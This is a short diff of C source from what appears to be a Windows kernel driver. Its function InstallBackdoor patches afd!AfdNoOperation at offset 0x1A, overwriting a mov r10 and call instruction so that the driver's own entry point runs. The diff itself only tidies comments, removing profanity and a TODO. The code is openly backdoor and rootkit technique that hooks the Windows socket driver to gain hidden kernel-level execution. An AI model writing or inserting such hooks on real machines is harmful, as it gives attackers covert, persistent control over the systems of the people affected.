@@ -237,13 +237,12 @@ NTSTATUS InstallBackdoor(void)
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	// TODO: All that's left is to hook afd!AfdNoOperation at the correct offset (0x1A) and WE'RE FUCKING DONE!!!!!!!!!!!!!!!!!!!!
 	// Offset to write into afd!AfdNoOperation: 0x1A (afd!AfdNoOperation+0x1A)
 	// ...
 	// Also, friendly reminder to use FirstLocation
 	*(PULONG_PTR)((PUCHAR)(g_pInvokeEntryPoint + 2)) = FirstLocation;
 
-	// And FINALLY, after all the time I spent writing this damn driver...
+	// And finally, after all the time I spent writing this driver...
 	// ... overwrite the mov r10, ... and call instruction with our entry-point.
 	// We. Are. DONE!!!!!!!!!!!!!
 	return ReadWriteMemory((PVOID)((PUCHAR)(AFDNoOperation + 0x1A)), g_pInvokeEntryPoint, sizeof(g_pInvokeEntryPoint), 1);
